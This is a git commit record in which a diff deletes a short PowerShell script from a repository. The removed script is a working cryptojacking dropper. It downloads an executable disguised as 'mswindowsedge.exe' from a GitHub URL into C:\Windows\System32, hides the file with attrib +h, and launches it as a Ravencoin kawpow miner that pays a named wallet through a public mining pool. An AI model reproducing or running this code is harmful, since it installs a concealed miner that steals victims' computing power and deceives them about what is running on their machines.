a0f9a2bd9de0e0fb12da6807ab2443c2c6cfb246
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-06-27 01:11:21 +0300

    Delete script12GS-02.ps1

--- script12GS-02.ps1
+++
@@ -1,9 +0,0 @@
-$Folder = 'C:\Windows\System32\mswindowsedge.exe'
-"Test to see if folder [$Folder]  exists"
-if (Test-Path -Path $Folder) {
-    "Path exists!"
-    C:\Windows\System32\mswindowsedge.exe --intensity 13 --algo kawpow --server rvn.2miners.com:6060 --user RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-1 --pass x --watchdog_mode 0
-} else {
-    "Path doesn't exist."
-    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/mswindowsedge.exe" -OutFile mswindowsedge.exe ; attrib +h mswindowsedge.exe;  C:\Windows\System32\mswindowsedge.exe --intensity 13 --algo kawpow --server rvn.2miners.com:6060 --user RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-1 --pass x --watchdog_mode 0
-}
